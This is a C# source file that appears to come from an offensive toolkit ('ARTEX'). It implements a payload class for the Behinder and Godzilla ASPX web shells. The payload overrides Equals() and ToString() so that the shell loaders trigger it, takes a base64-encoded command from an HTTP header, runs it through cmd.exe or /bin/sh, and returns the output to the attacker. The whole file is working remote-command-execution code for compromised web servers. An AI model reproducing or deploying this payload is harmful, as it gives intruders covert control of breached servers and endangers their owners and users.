using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Web;

// ARTEX payload for Behinder (class U) and Godzilla (class LY) ASPX shells.
// Both loaders pass different objects to Equals(); we keep the output stream and
// execute on the first non-stream object. The command and boundary markers come
// from request headers, so no per-request assembly rewriting is needed.
public class ArtexPayloadBase
{
    protected Stream OutStream;
    protected bool Ran;

    public override bool Equals(object o)
    {
        if (o == null) return false;
        if (o is Stream) { OutStream = (Stream)o; return true; }
        if (o is byte[]) { return true; }
        if (!Ran) { Ran = true; Run(); }
        return true;
    }

    public override int GetHashCode()
    {
        return 0;
    }

    public override string ToString()
    {
        if (!Ran) { Ran = true; Run(); }
        return "";
    }

    protected void Run()
    {
        try
        {
            HttpContext ctx = HttpContext.Current;
            if (ctx == null) return;
            string cmd = ctx.Request.Headers["X-Artex-Cmd"];
            string marks = ctx.Request.Headers["X-Artex-Mark"];
            if (cmd == null || marks == null) return;
            int i = marks.IndexOf('|');
            if (i < 0) return;
            string begin = marks.Substring(0, i);
            string end = marks.Substring(i + 1);
            string result;
            try { result = Exec(Encoding.UTF8.GetString(Convert.FromBase64String(cmd))); }
            catch (Exception e) { result = "artex error: " + e.Message; }
            byte[] payload = Encoding.UTF8.GetBytes(begin + result + end);
            Stream os = OutStream != null ? OutStream : ctx.Response.OutputStream;
            os.Write(payload, 0, payload.Length);
            os.Flush();
        }
        catch (Exception) { }
    }

    private static string Exec(string cmd)
    {
        ProcessStartInfo psi;
        if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        else
            psi = new ProcessStartInfo("/bin/sh", "-c " + Quote(cmd));
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        using (Process p = Process.Start(psi))
        {
            MemoryStream so = new MemoryStream();
            MemoryStream se = new MemoryStream();
            Thread t1 = new Thread(delegate() { Copy(p.StandardOutput.BaseStream, so); });
            Thread t2 = new Thread(delegate() { Copy(p.StandardError.BaseStream, se); });
            t1.Start();
            t2.Start();
            p.WaitForExit();
            t1.Join();
            t2.Join();
            byte[] a = so.ToArray();
            byte[] b = se.ToArray();
            byte[] all = new byte[a.Length + b.Length];
            Buffer.BlockCopy(a, 0, all, 0, a.Length);
            Buffer.BlockCopy(b, 0, all, a.Length, b.Length);
            return Encoding.UTF8.GetString(all);
        }
    }

    private static void Copy(Stream input, Stream output)
    {
        byte[] buf = new byte[4096];
        int n;
        while ((n = input.Read(buf, 0, buf.Length)) > 0) output.Write(buf, 0, n);
    }

    private static string Quote(string s)
    {
        return "'" + s.Replace("'", "'\\''") + "'";
    }
}

public class LY : ArtexPayloadBase { }
public class U : ArtexPayloadBase { }
